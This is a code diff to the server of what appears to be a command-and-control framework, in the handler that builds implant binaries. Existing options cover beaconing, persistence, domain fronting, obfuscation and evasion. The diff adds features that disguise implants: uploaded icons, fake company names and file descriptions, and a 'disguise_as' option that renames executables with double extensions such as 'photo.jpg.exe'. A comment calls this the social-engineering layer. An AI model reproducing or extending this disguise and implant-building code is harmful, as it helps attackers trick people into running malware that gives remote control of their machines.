@@ -9,52 +9,57 @@ import (
 	"time"
 
 	"github.com/forgec2/forgec2/internal/payload"
-	"github.com/gin-gonic/gin"
 	"github.com/forgec2/forgec2/internal/util"
+	"github.com/gin-gonic/gin"
 	"golang.org/x/crypto/ssh"
 )
 
 type binaryGenForm struct {
-	C2URL           string `form:"c2_url"`
-	Protocol        string `form:"protocol"`
-	BeaconTransport string `form:"beacon_transport"`
-	Interval        int    `form:"interval"`
-	Jitter          int    `form:"jitter"`
-	BeaconTime      int    `form:"beacon_time"`
-	UserAgent       string `form:"user_agent"`
-	Persist         bool   `form:"persist"`
-	SkipTLSVerify   bool   `form:"skip_tls_verify"`
-	Filename        string `form:"filename"`
-	Profile         string `form:"profile"`
-	ListenerID      uint   `form:"listener_id"`
-	P2PMode         string `form:"p2p_mode"`
-	P2PParent       string `form:"p2p_parent"`
-	P2PListenAddr   string `form:"p2p_listen_addr"`
-	DNSDomain       string `form:"dns_domain"`
-	DNSServer       string `form:"dns_server"`
-	DNSDoHURL       string `form:"dns_doh_url"`
-	DNSDoTAddr      string `form:"dns_dot_addr"`
-	Proxy           string `form:"proxy"`
-	CryptoKey       string `form:"crypto_key"`
-	BeaconKey       string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
-	Architecture    string `form:"architecture"`
-	DomainFront     string `form:"domain_front"`
-	Obfuscate       string `form:"obfuscate"`
-	Evasion         string `form:"evasion"`
-	GhostMode       string `form:"ghost_mode"`
-	WorkingStart    string `form:"working_start"`
-	WorkingEnd      string `form:"working_end"`
-	WorkingTZ       string `form:"working_tz"`
-	SSHUser         string `form:"ssh_user"`
-	SSHPassword     string `form:"ssh_password"`
-	SSHKey          string `form:"ssh_key"`
-	SSHHostKey      string `form:"ssh_host_key"` // base64 server host public key pin
+	C2URL            string `form:"c2_url"`
+	Protocol         string `form:"protocol"`
+	BeaconTransport  string `form:"beacon_transport"`
+	Interval         int    `form:"interval"`
+	Jitter           int    `form:"jitter"`
+	BeaconTime       int    `form:"beacon_time"`
+	UserAgent        string `form:"user_agent"`
+	Persist          bool   `form:"persist"`
+	SkipTLSVerify    bool   `form:"skip_tls_verify"`
+	Filename         string `form:"filename"`
+	Profile          string `form:"profile"`
+	ListenerID       uint   `form:"listener_id"`
+	P2PMode          string `form:"p2p_mode"`
+	P2PParent        string `form:"p2p_parent"`
+	P2PListenAddr    string `form:"p2p_listen_addr"`
+	DNSDomain        string `form:"dns_domain"`
+	DNSServer        string `form:"dns_server"`
+	DNSDoHURL        string `form:"dns_doh_url"`
+	DNSDoTAddr       string `form:"dns_dot_addr"`
+	Proxy            string `form:"proxy"`
+	CryptoKey        string `form:"crypto_key"`
+	BeaconKey        string `form:"beacon_key"` // pre-shared key; empty = server's configured beacon_key
+	Architecture     string `form:"architecture"`
+	DomainFront      string `form:"domain_front"`
+	Obfuscate        string `form:"obfuscate"`
+	Evasion          string `form:"evasion"`
+	GhostMode        string `form:"ghost_mode"`
+	WorkingStart     string `form:"working_start"`
+	WorkingEnd       string `form:"working_end"`
+	WorkingTZ        string `form:"working_tz"`
+	SSHUser          string `form:"ssh_user"`
+	SSHPassword      string `form:"ssh_password"`
+	SSHKey           string `form:"ssh_key"`
+	SSHHostKey       string `form:"ssh_host_key"` // base64 server host public key pin
 	PinnedCertSHA256 string `form:"pinned_cert_sha256"`
-	ExpiryDate      string `form:"expiry_date"`   // "YYYY-MM-DD"; implant auto-exits after this date
-	SelfCheck       bool   `form:"self_check"`    // embed + verify a SHA-256 self-integrity hash
-	NetCfgOverWire  bool   `form:"network_config_over_wire"` // bootstrap-only compile; server delivers full config at registration
+	ExpiryDate       string `form:"expiry_date"`              // "YYYY-MM-DD"; implant auto-exits after this date
+	SelfCheck        bool   `form:"self_check"`               // embed + verify a SHA-256 self-integrity hash
+	NetCfgOverWire   bool   `form:"network_config_over_wire"` // bootstrap-only compile; server delivers full config at registration
 	// Max random bytes appended to the HTTP/WS beacon body (0=disabled).
-	ContentLengthJitter int `form:"content_length_jitter"`
+	ContentLengthJitter int    `form:"content_length_jitter"`
+	IconB64             string `form:"icon_b64"`
+	IconPreset          string `form:"icon_preset"`
+	FileDescription     string `form:"file_description"`
+	CompanyName         string `form:"company_name"`
+	DisguiseAs          string `form:"disguise_as"`
 }
 
 // parseBinaryForm validates a binary generation request and returns the resolved form.
@@ -64,6 +69,30 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 	if err := c.ShouldBind(&form); err != nil {
 		respondError(c, http.StatusBadRequest, "Invalid request parameters")
 		return nil, false
+	}
+	// Handle icon file upload (multipart "icon" field) — overrides icon_b64 if present
+	if fh, err := c.FormFile("icon"); err == nil && fh != nil {
+		if fh.Size > 256*1024 {
+			respondError(c, http.StatusBadRequest, "icon file too large (max 256KB)")
+			return nil, false
+		}
+		f, err := fh.Open()
+		if err == nil {
+			defer f.Close()
+			buf := make([]byte, 256*1024+1)
+			n, _ := f.Read(buf)
+			if n > 256*1024 {
+				respondError(c, http.StatusBadRequest, "icon file too large (max 256KB)")
+				return nil, false
+			}
+			data := buf[:n]
+			// Validate ICO/PNG magic before accepting
+			if len(data) >= 4 && !(data[0] == 0 && data[1] == 0 && data[2] == 1 && data[3] == 0) && !(data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47) {
+				respondError(c, http.StatusBadRequest, "icon must be .ico (00 00 01 00) or .png")
+				return nil, false
+			}
+			form.IconB64 = base64.StdEncoding.EncodeToString(data)
+		}
 	}
 
 	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
@@ -111,10 +140,49 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 		}
 	}
 
+	// Handle JPG disguise: if disguise_as=jpg, ensure filename looks like a JPG
+	// (e.g. photo.jpg.exe). This is the user-visible social-engineering layer;
+	// the icon layer is handled in payload.GenerateWindowsEXE.
+	if form.DisguiseAs == "jpg" && form.Filename != "" {
+		lower := strings.ToLower(form.Filename)
+		if !strings.Contains(lower, ".jpg") {
+			// Strip existing .exe and append .jpg.exe
+			base := strings.TrimSuffix(form.Filename, ".exe")
+			base = strings.TrimSuffix(base, ".EXE")
+			base = strings.TrimSuffix(base, ".jpg")
+			base = strings.TrimSuffix(base, ".JPG")
+			form.Filename = base + ".jpg.exe"
+		}
+	}
+	// Validate icon payload (≤350KB base64 ≈ 256KB raw)
+	if form.IconB64 != "" {
+		if len(form.IconB64) > 350*1024 {
+			respondError(c, http.StatusBadRequest, "icon too large (max 256KB raw, ~350KB base64)")
+			return nil, false
+		}
+		if _, err := base64.StdEncoding.DecodeString(form.IconB64); err != nil {
+			respondError(c, http.StatusBadRequest, "icon is not valid base64")
+			return nil, false
+		}
+	}
+	// Restrict disguise_as to known values
+	if form.DisguiseAs != "" && form.DisguiseAs != "jpg" && form.DisguiseAs != "pdf" {
+		form.DisguiseAs = ""
+	}
+
 	// Prefix filename with short UUID to prevent concurrent build collisions.
 	// Sanitize first to block path traversal and header-injection characters.
 	if form.Filename != "" {
+		// Preserve double extension for disguise (e.g. .jpg.exe) — sanitize each part
+		origDisguise := form.DisguiseAs == "jpg" && strings.Contains(strings.ToLower(form.Filename), ".jpg.exe")
 		form.Filename = sanitizeFilename(form.Filename)
+		// sanitizeFilename replaces '.'-prefixed leading dots and may mangle double ext;
+		// re-apply disguise suffix if it was stripped
+		if origDisguise && !strings.Contains(strings.ToLower(form.Filename), ".jpg") {
+			base := strings.TrimSuffix(form.Filename, ".exe")
+			base = strings.TrimSuffix(base, ".EXE")
+			form.Filename = base + ".jpg.exe"
+		}
 		shortID := strings.Replace(util.NewString()[:8], "-", "", -1)
 		form.Filename = fmt.Sprintf("%s_%s", shortID, form.Filename)
 	}
@@ -177,50 +245,55 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig,
 	}
 
 	return payload.ImplantConfig{
-		C2URL:           form.C2URL,
-		Protocol:        form.Protocol,
-		BeaconTransport: form.BeaconTransport,
-		Interval:        interval,
-		Jitter:          jitter,
-		UserAgent:       form.UserAgent,
-		Persist:         form.Persist,
-		SkipTLSVerify:   form.SkipTLSVerify,
-		Filename:        form.Filename,
-		Debug:           false,
-		MalleablePrepend: prepend,
-		MalleableAppend:  appendBytes,
-		Profile:         form.Profile,
-		ListenerID:      form.ListenerID,
-		P2PMode:         p2pMode,
-		P2PParent:       p2pParent,
-		P2PListenAddr:   p2pListenAddr,
-		DNSDomain:       form.DNSDomain,
-		DNSServer:       form.DNSServer,
-		DNSDoHURL:       form.DNSDoHURL,
-		DNSDoTAddr:      form.DNSDoTAddr,
-		Proxy:           form.Proxy,
-		CryptoKey:       form.CryptoKey,
-		BeaconKey:       beaconKey,
-		RegSecretID:     regSecretID,
-		RegSecret:       regSecretB64,
-		Architecture:    arch,
-		DomainFront:     form.DomainFront,
-		Obfuscate:       form.Obfuscate == "true" || form.Obfuscate == "1",
-		Evasion:         form.Evasion == "true" || form.Evasion == "1",
-		GhostMode:       form.GhostMode == "true" || form.GhostMode == "1",
-		WorkingStart:    form.WorkingStart,
-		WorkingEnd:      form.WorkingEnd,
-		WorkingTZ:       form.WorkingTZ,
+		C2URL:                 form.C2URL,
+		Protocol:              form.Protocol,
+		BeaconTransport:       form.BeaconTransport,
+		Interval:              interval,
+		Jitter:                jitter,
+		UserAgent:             form.UserAgent,
+		Persist:               form.Persist,
+		SkipTLSVerify:         form.SkipTLSVerify,
+		Filename:              form.Filename,
+		Debug:                 false,
+		MalleablePrepend:      prepend,
+		MalleableAppend:       appendBytes,
+		Profile:               form.Profile,
+		ListenerID:            form.ListenerID,
+		P2PMode:               p2pMode,
+		P2PParent:             p2pParent,
+		P2PListenAddr:         p2pListenAddr,
+		DNSDomain:             form.DNSDomain,
+		DNSServer:             form.DNSServer,
+		DNSDoHURL:             form.DNSDoHURL,
+		DNSDoTAddr:            form.DNSDoTAddr,
+		Proxy:                 form.Proxy,
+		CryptoKey:             form.CryptoKey,
+		BeaconKey:             beaconKey,
+		RegSecretID:           regSecretID,
+		RegSecret:             regSecretB64,
+		Architecture:          arch,
+		DomainFront:           form.DomainFront,
+		Obfuscate:             form.Obfuscate == "true" || form.Obfuscate == "1",
+		Evasion:               form.Evasion == "true" || form.Evasion == "1",
+		GhostMode:             form.GhostMode == "true" || form.GhostMode == "1",
+		WorkingStart:          form.WorkingStart,
+		WorkingEnd:            form.WorkingEnd,
+		WorkingTZ:             form.WorkingTZ,
 		NetworkConfigOverWire: form.NetCfgOverWire,
-		SSHUser:         form.SSHUser,
-		SSHPassword:     form.SSHPassword,
-		SSHKey:          form.SSHKey,
-		SSHHostKey:      hostKey,
-		PinnedCertSHA256: form.PinnedCertSHA256,
-		ExpiryDate:       form.ExpiryDate,
-		SelfCheck:        form.SelfCheck,
-		ContentLengthJitter: form.ContentLengthJitter,
-		DNSObscure:          s.cfg != nil && s.cfg.Server.DNSObscure,
+		SSHUser:               form.SSHUser,
+		SSHPassword:           form.SSHPassword,
+		SSHKey:                form.SSHKey,
+		SSHHostKey:            hostKey,
+		PinnedCertSHA256:      form.PinnedCertSHA256,
+		ExpiryDate:            form.ExpiryDate,
+		SelfCheck:             form.SelfCheck,
+		ContentLengthJitter:   form.ContentLengthJitter,
+		DNSObscure:            s.cfg != nil && s.cfg.Server.DNSObscure,
+		IconB64:               form.IconB64,
+		IconPreset:            form.IconPreset,
+		FileDescription:       form.FileDescription,
+		CompanyName:           form.CompanyName,
+		DisguiseAs:            form.DisguiseAs,
 	}, nil
 }
 
